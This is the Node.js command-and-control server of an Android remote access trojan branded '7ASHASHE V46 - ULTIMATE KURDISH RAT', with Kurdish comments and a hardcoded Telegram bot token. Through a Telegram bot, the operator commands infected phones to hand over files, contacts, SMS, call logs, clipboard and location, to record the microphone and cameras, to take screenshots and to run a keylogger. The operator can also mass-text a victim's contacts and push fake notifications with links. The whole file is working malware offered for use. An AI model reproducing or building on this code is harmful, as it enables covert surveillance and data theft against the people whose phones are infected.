const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// =====================================================
// 🔐 زانیاری تێلیگرام - 7ASHASHE
// =====================================================
const token = process.env.bot_token || '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU'
const id = process.env.bot_id || '5578405082'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer({ dest: 'uploadedFile/' });
const fs = require('fs');

app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// =====================================================
// 🏠 لاپەڕەی سەرەکی
// =====================================================
app.get('/', function (req, res) {
    res.send('<h1 align="center">🔴 7ASHASHE V46 - ULTIMATE KURDISH RAT</h1>')
})

// =====================================================
// 📥 وەرگرتنی فایل
// =====================================================
app.get('/getFile/*', function (req, res) {
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if(err == null) {
      res.sendFile(filePath)
    } else if (err.code === 'ENONET') {
      res.send(`<h1>فایل بوونی نییە</h1>`)
    } else {
      res.send(`<h1>هەڵە ڕویدا</h1>`)
    }
  });
})

// =====================================================
// 🗑️ سڕینەوەی فایل
// =====================================================
app.get('/deleteFile/*', function (req, res) {
  const fileName = req.params[0]
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if (err == null) {
      fs.unlink(filePath, (err) => {
        if (err) {
          res.send(`<h1>فایلی "${fileName}" نەسڕایەوە</h1>` + `<br><br>` + `<h1>دووبارە هەوڵ بدەرەوە!</h1>`)
        } else {
          res.send(`<h1>فایلی "${fileName}" سڕایەوە</h1>` + `<br><br>` + `<h1>سەرکەوتوو بوو!!!</h1>`)
        }
      });
    } else if (err.code === 'ENOENT') {
      res.send(`<h1>"${fileName}" بوونی نییە</h1>` + `<br><br>` + `<h1>فایلەکە بوونی نییە بۆ سڕینەوە.</h1>`)
    } else {
      res.send('<h1>هەڵەیەک ڕویدا: </h1>', err.code)
    }
  });
})

// =====================================================
// 📤 بارکردنی فایل
// =====================================================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    const file_name = req.file.filename
    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
    const host_url = req.protocol + '://' + req.get('host')
    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
      if ( err ) console.log('هەڵە: ' + err);
    });
    appBot.sendMessage(id, `🔴 **پەیام لە <b>${req.headers.model}</b>**\n\n ناوی فایل: ` + name + ` \n ئایدی فایل: ` + file_name + `\n\n لینکی فایل: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n لینکی سڕینەوە: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
{parse_mode: "HTML", disable_web_page_preview: true})
   res.send('')
})

// =====================================================
// 📝 ناردنی تێکست
// =====================================================
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `🔴 **پەیام لە <b>${req.headers.model}</b>**\n\n` + req.body['text'],
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML", disable_web_page_preview: true})
    res.send('')
})

// =====================================================
// 📍 ناردنی شوێن
// =====================================================
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `🔴 **شوێنی <b>${req.headers.model}</b>**`,
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML"})
    res.send('')
})

// =====================================================
// 🔌 پەیوەندی WebSocket
// =====================================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `🔴 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** <b>${model}</b>\n` +
        `🔋 **پاتری:** <b>${battery}</b>\n` +
        `📱 **ئەندرۆید:** <b>${version}</b>\n` +
        `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
        `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `🔴 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 **مۆدێل:** <b>${model}</b>\n` +
            `🔋 **پاتری:** <b>${battery}</b>\n` +
            `📱 **ئەندرۆید:** <b>${version}</b>\n` +
            `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
            `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

// =====================================================
// 🤖 بۆتی تێلیگرام - فەرمانەکان
// =====================================================
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        // ناردنی SMS
        if (message.reply_to_message.text.includes('🔴 تکایە ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '🔴 **باشە، ئێستا پەیامەکە بنووسە بۆ ناردن بۆ ئەم ژمارەیە**\n\n' +
                '• ئاگادار بە کە ئەگەر پەیامەکە زۆر درێژ بێت، ڕەنگە نەنێردرێت',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('🔴 باشە، ئێستا پەیامەکە بنووسە بۆ ناردن بۆ ئەم ژمارەیە')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // ناردنی پەیام بۆ هەموو کۆنتاکتەکان
        if (message.reply_to_message.text.includes('🔴 پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // ناردنی لینک
        if (message.reply_to_message.text.includes('🔴 لینکەکە بنووسە بۆ ناردن')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`open_target_link:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // دەنگ بۆ تێکست
        if (message.reply_to_message.text.includes('🔴 دەقەکە بنووسە بۆ گۆڕین بۆ دەنگ')) {
            const message_to_tts = message.text
            const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=ckb&client=t&q=' + encodeURIComponent(message_to_tts)
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`text_to_speech:${message_tts_link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // وەرگرتنی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ وەرگرتن')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // سڕینەوەی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ سڕینەوە')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // تۆمارکردنی دەنگ
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی دەنگ بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // تۆمارکردنی کامێرای پشت
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پشت بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // تۆمارکردنی کامێرای پێش
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پێش بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // ناردنی Toast
        if (message.reply_to_message.text.includes('🔴 پەیامی Toast بنووسە بۆ نیشاندان')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // ناردنی ئاگاداری
        if (message.reply_to_message.text.includes('🔴 ناونیشانی ئاگاداری بنووسە')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '🔴 **زۆر باشە، ئێستا لینکەکە بنووسە بۆ کردنەوە**\n\n' +
                '• کاتێک نێچیرەکە کرتە لەسەر ئاگادارییەکە دەکات، ئەم لینکە دەکرێتەوە',
                {reply_markup: {force_reply: true}}
            )
        }

        if (message.reply_to_message.text.includes('🔴 زۆر باشە، ئێستا لینکەکە بنووسە بۆ کردنەوە')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }

        // لێدانی دەنگ
        if (message.reply_to_message.text.includes('🔴 لینکی دەنگەکە بنووسە بۆ لێدان')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '🔴 **بەخێربێیت بۆ 7ASHASHE RAT - وەحشی ترین RAT**\n\n' +
                '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر دامەزرابێت، چاوەڕێی پەیوەندی بکە\n\n' +
                '• کاتێک پەیامی پەیوەندیت وەرگرت، ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
                '• کلیک لە دوگمەی فەرمانەکان بکە و ئامێرەکە هەڵبژێرە\n\n' +
                '• ئەگەر لە شوێنێکدا گیری خواردیت، /start بنێرە\n\n' +
                '• **پەرەپێدراو لەلایەن: 7ASHASHE**',
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.text == '🔴 ئامێرەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    '• دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                )
            } else {
                let text = '🔴 **لیستی ئامێرە پەیوەستکراوەکان**\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `📱 **مۆدێل:** <b>${value.model}</b>\n` +
                        `🔋 **پاتری:** <b>${value.battery}</b>\n` +
                        `📱 **ئەندرۆید:** <b>${value.version}</b>\n` +
                        `💡 **ڕووناکی:** <b>${value.brightness}</b>\n` +
                        `📡 **پڕۆڤایدەر:** <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }

        if (message.text == '🔴 فەرمانەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    '• دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '🔴 **ئامێرەکە هەڵبژێرە بۆ جێبەجێکردنی فەرمان**', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '🔴 **ڕێگەپێدان نەدرا**')
    }
})

// =====================================================
// 🔘 کۆدەکانی کلیکی ئینڵاین
// =====================================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    
    if (commend == 'device') {
        appBot.editMessageText(`🔴 **فەرمانەکان هەڵبژێرە بۆ ئامێری <b>${appClients.get(data.split(':')[1]).model}</b>**`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱 ئەپەکان', callback_data: `apps:${uuid}`},
                        {text: 'ℹ️ زانیاری ئامێر', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📁 وەرگرتنی فایل', callback_data: `file:${uuid}`},
                        {text: '🗑️ سڕینەوەی فایل', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📋 کلیپبۆرد', callback_data: `clipboard:${uuid}`},
                        {text: '🎤 مایکرۆفۆن', callback_data: `microphone:${uuid}`}
                    ],
                    [
                        {text: '📸 کامێرای پشت', callback_data: `camera_main:${uuid}`},
                        {text: '🤳 کامێرای پێش', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📹 تۆماری کامێرای پشت', callback_data: `rec_camera_main:${uuid}`},
                        {text: '🎥 تۆماری کامێرای پێش', callback_data: `rec_camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍 شوێن', callback_data: `location:${uuid}`},
                        {text: '💬 Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📞 پەیوەندییەکان', callback_data: `calls:${uuid}`},
                        {text: '👥 کۆنتاکتەکان', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳 لەرزین', callback_data: `vibrate:${uuid}`},
                        {text: '🔔 ئاگاداری', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '📨 پەیامەکان', callback_data: `messages:${uuid}`},
                        {text: '📤 ناردنی پەیام', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🎵 لێدانی دەنگ', callback_data: `play_audio:${uuid}`},
                        {text: '⏹️ وەستاندنی دەنگ', callback_data: `stop_audio:${uuid}`}
                    ],
                    [
                        {text: '🔥 ئاگر', callback_data: `my_fire_emoji:${uuid}`},
                        {text: '📸 سکرینشۆت', callback_data: `screenshot:${uuid}`}
                    ],
                    [
                        {text: '🔦 چرای پشت', callback_data: `torch_on:${uuid}`},
                        {text: '🔦 کوژاندنەوەی چرا', callback_data: `torch_off:${uuid}`}
                    ],
                    [
                        {text: '⌨️ کێڤلۆگەر', callback_data: `keylogger_on:${uuid}`},
                        {text: '⏹️ وەستاندنی کێڤلۆگەر', callback_data: `keylogger_off:${uuid}`}
                    ],
                    [
                        {text: '🔗 ناردنی لینک', callback_data: `open_target_link:${uuid}`},
                        {text: '🔊 دەنگ بۆ دەق', callback_data: `text_to_speech:${uuid}`}
                    ],
                    [
                        {text: '📢 ناردن بۆ هەموو کۆنتاکتەکان', callback_data: `send_message_to_all:${uuid}`}
                    ],
                    [
                        {text: '🔘 دوگمەکانی ئامێر', callback_data: `device_button:${uuid}`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }

    // فەرمانە سادەکان
    const simpleCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 
                           'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio',
                           'torch_on', 'torch_off', 'keylogger_on', 'keylogger_off', 'screenshot'];

    simpleCommands.forEach(cmd => {
        if (commend == cmd) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == uuid) {
                    ws.send(cmd);
                }
            });
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە'
            )
        }
    });

    // ناردنی SMS
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '🔴 **تکایە ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە**\n\n' +
            '• ئەگەر دەتەوێت بۆ ژمارەی ناوخۆیی بنێریت، دەتوانیت بە سفیر دەست پێ بکەیت، ئەگینا ژمارەکە بە کۆدی وڵاتەوە بنووسە',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }

    // ناردنی پەیام بۆ هەموو کۆنتاکتەکان
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان**\n\n' +
            '• ئاگادار بە کە ئەگەر پەیامەکە زۆر درێژ بێت، ڕەنگە نەنێردرێت',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    // ناردنی لینک
    if (commend == 'open_target_link') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **لینکەکە بنووسە بۆ ناردن**\n\n' +
            '• تەنها لینک بنووسە بەبێ هیچ دەقێکی تر',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    // دەنگ بۆ تێکست
    if (commend == 'text_to_speech') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **دەقەکە بنووسە بۆ گۆڕین بۆ دەنگ**\n\n' +
            '• دەقەکە دەبێت بە کوردی یان هەر زمانێکی تر بێت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // ئاگر 🔥
    if (commend == 'my_fire_emoji') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە\n🔥🔥\n🔥🔥',
            {reply_markup: {force_reply: false}, parse_mode: "HTML"})
        appBot.sendMessage(id,
            '  🔥  \n' +
            ' 🔥🔥 \n' +
            '🔥🔥🔥',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
        currentUuid = uuid
    }

    // دوگمەکانی ئامێر
    if (commend == 'device_button') {
        currentUuid = uuid
        appBot.editMessageText(`🔴 **دوگمەکانی ئامێری <b>${appClients.get(data.split(':')[1]).model}</b>**`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '|||', callback_data: `device_btn_:${currentUuid}:recent`},
                        {text: '■', callback_data: `device_btn_:${currentUuid}:home`},
                        {text: '<', callback_data: `device_btn_:${currentUuid}:back`}
                    ],
                    [
                        {text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`},
                        {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`},
                        {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}
                    ],
                    [
                        {text: '🔙 گەڕانەوە', callback_data: `device_btn_:${currentUuid}:exit`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }

    // کۆدەکانی دوگمەکانی ئامێر
    if (commend == 'device_btn_') {
        switch (data.split(':')[2]) {
            case 'recent':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_recent');
                    }
                });
                break;
            case 'home':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_home');
                    }
                });
                break;
            case 'back':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_back');
                    }
                });
                break;
            case 'vol_up':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_up');
                    }
                });
                break;
            case 'vol_down':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_down');
                    }
                });
                break;
            case 'power':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_power');
                    }
                });
                break;
            case 'exit':
                appBot.deleteMessage(id, msg.message_id)
                break;
        } 
    }

    // وەرگرتنی فایل
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ وەرگرتن**\n\n' +
            '• پێویست ناکات هەموو ڕێگاکە بنووسیت، تەنها ڕێگای سەرەکی بنووسە. نموونە: <b>DCIM/Camera</b> بۆ وەرگرتنی وێنەکان',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // سڕینەوەی فایل
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ سڕینەوە**\n\n' +
            '• پێویست ناکات هەموو ڕێگاکە بنووسیت، تەنها ڕێگای سەرەکی بنووسە. نموونە: <b>DCIM/Camera</b> بۆ سڕینەوەی وێنەکان',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // تۆمارکردنی دەنگ
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ماوەی تۆمارکردنی دەنگ بنووسە (بە چرکە)**\n\n' +
            '• تەنها ژمارە بنووسە، نموونە: 10 بۆ ١٠ چرکە',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // تۆمارکردنی کامێرای پێش
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ماوەی تۆمارکردنی کامێرای پێش بنووسە (بە چرکە)**\n\n' +
            '• تەنها ژمارە بنووسە، نموونە: 10 بۆ ١٠ چرکە',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // تۆمارکردنی کامێرای پشت
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ماوەی تۆمارکردنی کامێرای پشت بنووسە (بە چرکە)**\n\n' +
            '• تەنها ژمارە بنووسە، نموونە: 10 بۆ ١٠ چرکە',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // ناردنی Toast
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **پەیامی Toast بنووسە بۆ نیشاندان**\n\n' +
            '• Toast پەیامێکی کورتە کە بۆ چەند چرکەیەک لەسەر شاشە دەردەکەوێت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // ناردنی ئاگاداری
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ناونیشانی ئاگاداری بنووسە**\n\n' +
            '• ئەم پەیامە وەک ئاگاداری لە شریتی دۆخی ئامێرەکەدا دەردەکەوێت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // لێدانی دەنگ
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **لینکی دەنگەکە بنووسە بۆ لێدان**\n\n' +
            '• پێویستە لینکی ڕاستەوخۆ بێت، ئەگینا کار ناکات',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});

// =====================================================
// 🔄 پینگ و پاراستنی سێرڤەر
// =====================================================
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر (پۆرت 8080)
// =====================================================
const PORT = process.env.PORT || 8080;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V46 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - 7ASHASHE`);
    
    appBot.sendMessage(id,
        `🔴 **7ASHASHE V46 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **Master: 7ASHASHE**\n` +
        `📊 وەشان: 46.0.0\n` +
        `🌐 پۆرت: ${PORT}\n` +
        `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
        `🦁 **7ASHASHE**`
    );
});
